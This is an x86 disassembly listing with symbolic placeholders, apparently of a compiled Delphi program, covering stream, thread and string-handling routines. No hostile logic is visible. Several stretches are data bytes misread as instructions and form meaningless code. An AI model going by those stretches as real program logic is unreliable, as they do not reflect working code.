push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_479f29
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx esi
mov edi [ ebx + 0x4 ]
mov edx edi
lea eax [ edi + esi ]
call sub_4028e8
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax ebx
call sub_41b5dc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479f30
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
sub_479f38
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jle r-xdata
mov eax esi
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn 0x4
xor ecx ecx
mov edx eax
test edx edx
jl r-xdata
test cl cl
jne r-xdata
inc edx
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x64 ]
add eax 0x2
dec edx
jne r-xdata
mov cl 0x1
jmp r-xdata
cmp si [ eax ]
jne r-xdata
sub_479f84
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47a0ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47a082
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_479384
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_40436c
cmp eax 0x3
jle r-xdata
mov eax [ ebx + 0x80 ]
mov edx [ ebp - 0x8 ]
call sub_476d20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a089
lea eax [ ebp - 0x8 ]
call sub_40d564
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x3
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4045cc
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov ecx r-xdata
call sub_4043b8
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4045cc
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_4080e8
test al al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_479384
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_40436c
cmp eax 0x4
jl r-xdata
sub_47a0c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47a112
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_476e2c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a119
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_476ba8
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
sub_47a120
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47a1c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a1cd
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040d0
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4044b8
jne r-xdata
inc ebx
dec esi
jne r-xdata
sub_47a220
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_479d78
mov [ esi + 0x20 ] 0x8000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47a268
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47a2f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
call sub_47a304
mov edx eax
mov eax edi
mov ecx esi
call sub_40419c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a2fb
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
sub_47a310
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x24 ]
test esi esi
jle r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
add eax esi
call sub_4028e8
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
xor eax eax
mov [ ebx + 0x24 ] eax
sub_47a348
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47a3fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
add [ ebx + 0x24 ] esi
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x20 ]
jl r-xdata
mov eax ebx
call sub_47a20c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a403
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
mov eax ebx
call sub_47a310
sub_47a408
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
sub ax 0x1
jae r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_41b58c
sub eax [ ebx + 0x24 ]
mov edx [ ebx + 0x24 ]
add edx edi
xor ecx ecx
mov eax ebx
call sub_41b58c
sub eax [ ebx + 0x24 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47a440
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47a465
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a46c
retn
sub_47a478
les esp [ edi + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
movsb [ edi ] [ esi ]
inc edi
add [ eax + eax ] cl
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
inc edi
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x12004032 ] ah
inc ebp
dec ecx
push esp
push 0x64616572
inc ebp
js r-xdata
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x1c004032 ] ah
inc ebp
dec ecx
push esp
push 0x64616572
push esp
jb r-xdata
popad
je r-xdata
jo r-xdata
push esp
imul ebp [ esi + 0x61 ] 0x6e416574
popad
jae r-xdata
inc edx
push edi
popad
imul esi [ esi + eax * 2 + 0x6f ] r-xdata
nop
movsd [ edi ] [ esi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x400047a5 ] bl
add [ eax ] al
add ah ah
outsb
inc ecx
outsb
inc ecx
add al ah
xor al 0x40
add [ edi + ecx + 0x34f00042 ] bh
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edi + ecx + 0x42 ] dl
add [ eax + 0x10 ] dh
inc edx
add ah ch
sub al [ eax ]
or eax 0x42644954
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
movsd [ edi ] [ esi ]
inc edi
add [ eax ] al
add [ eax ] al
in al 0x6e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xc0047 ] ah
add [ eax ] al
js r-xdata
imul ebp [ edi + 0x6e ] 0x47a52490
inc edi
add [ eax + 0x10 ] dh
inc edx
add [ edi ] ah
inc edi
add [ eax ] bl
cmpsd [ esi ] [ edi ]
inc edi
add [ eax ] ah
cmpsd [ esi ] [ edi ]
inc edi
add [ edi ] bl
push esp
push 0x64616572
nop
movsd [ edi ] [ esi ]
inc edi
add [ eax + 0x6f ] al
inc ecx
add [ eax ] al
add [ eax ] cl
dec ecx
push esp
push 0x64616572
add [ eax ] al
sbb al 0xa6
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5a ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x5a ] ch
inc edi
add [ eax ] ch
add [ eax ] al
inc esp
movsd [ edi ] [ esi ]
inc edi
add al ah
xor al 0x40
add [ edi + ecx + 0x34f00042 ] bh
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] ch
test eax 0x10700047
xor al 0x40
push 0x64616572
mov eax eax
lodsb [ esi ]
movsd [ edi ] [ esi ]
inc edi
add [ edi ] al
or eax 0x42644954
popad
jae r-xdata
push esp
jo r-xdata
inc edi
add [ edi ] al
or [ ecx + ecx * 2 + 0x64 ] edx
push esp
push 0x64616572
sbb al 0xa6
inc edi
add [ eax + 0x47a5 ] ch
add [ eax ] cl
dec ecx
push esp
push 0x64616572
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47a706
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xf ] 0x0
je r-xdata
inc edi
add [ edi ] dl
inc edi
add al bl
stosb [ edi ]
inc edi
add [ edx + ebp * 4 - 0x555fffb9 ] dh
inc edi
add ah ch
sub al [ eax ]
nop
test al 0x47
add [ eax - 0x57 ] ah
inc edi
add al al
test eax 0xaacc0047
inc edi
add [ eax + 0xe0047a6 ] bl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] edx
push esp
push 0x64616572
js r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0xe ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax ebx
call sub_4212cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a70d
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax ebx
call sub_42129c
sub_47a724
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4038a4#8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_47a832
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47aa28
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a839
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
retn
xor eax eax
push ebp
push sub_47a808
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_47a7eb
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_47aa28
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47aa28
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a7f2
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8 ]
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_421218
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
sub_47a848
add [ eax ] eax
add [ eax ] al
push 0x54004072
test al 0x47
add [ ecx - 0x173c743d ] cl
fwait
mov eax edi
dec [ ebx + 0x4289fc55 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x4c
mov edx [ ebx + 0x4 ]
call sub_404100
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_403ae0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47a890
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] bl
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c6ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] eax
xor eax eax
push ebp
push j_sub_403778#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420e84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47a928
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov [ esi + 0xf ] 0x0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420f54
mov eax esi
mov edx [ eax ]
call [ edx + 0x18 ]
lea eax [ esi + 0x44 ]
call sub_40d564
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_47a960
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42c774
xor eax eax
push ebp
push sub_47a9b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47aa28
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a9bd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42c77c
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_421218
sub_47a9c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42c774
xor eax eax
push ebp
push sub_47aa1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47aa28
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47aa25
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42c77c
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x48 ]
sub al 0x1
jae r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_47aa28
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
call sub_42c774
xor eax eax
push ebp
push sub_47aa8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x49 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xe ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42c77c
retn
sub_47aae4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47ab09
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ab10
retn
sub_47ac10
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_474aa8
test al al
jne r-xdata
mov [ ebx + 0xf ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0xe ] 0x0
jne r-xdata
mov eax ebx
call sub_4032b0
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
mov edx ebx
mov eax [ esi + 0x30 ]
call sub_418d88
pop esi
pop ebx
retn
sub_47ac50
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47ac75
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ac7c
retn
sub_47af3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47af61
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47af68
retn
sub_47af74
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b048
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0xc ]
call sub_40436c
mov [ ebp - 0x10 ] eax
mov ebx 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_4046b0
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_40436c
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
sub ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4045cc
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b04f
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4040d0
retn
lea eax [ ebp - 0x18 ]
push eax
mov ecx 0x7fffffff
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4045cc
mov edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov ebx [ ebp - 0x10 ]
add ebx esi
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_474b70
mov esi eax
test esi esi
jg r-xdata
mov ecx ebx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_47b058
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47b189
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_40436c
mov [ ebp - 0x10 ] eax
mov ebx 0x1
lea edx [ ebp - 0xc ]
mov eax esi
call sub_408120
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
call sub_40436c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b190
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_4040d0
lea eax [ ebp - 0x14 ]
call sub_4040ac
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp [ esi + eax ] 0x20
jbe r-xdata
inc [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4046b0
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebp - 0xc ]
call sub_40436c
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
sub ecx ebx
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_4045cc
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov ecx 0x7fffffff
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_4045cc
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_408120
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
add ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov ebx [ ebp - 0x10 ]
add ebx esi
mov ecx ebx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_474b70
mov esi eax
test esi esi
jg r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_408120
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
add ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_47b198
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47b1bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b1c4
retn
sub_47b1d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_47b215
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418d74
cmp ebx [ eax + 0x8 ]
seta [ ebp - 0x5 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_418dd8
retn
sub_47b228
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47b24d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b254
retn
sub_47b3f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421370
mov dl 0x1
mov eax [ r-xdata ]
call sub_418c1c
mov [ esi + 0x30 ] eax
mov [ esi + 0x38 ] 0x3
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47b438
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_47b4a7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebx + 0x34 ]
call [ eax + 0x28 ]
mov esi eax
mov ecx 0x80000001
mov dl [ ebx + 0x38 ]
mov eax esi
call sub_474ad4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b4ae
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
sub_47b4b8
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
lea eax [ esi + 0x30 ]
call sub_40d564
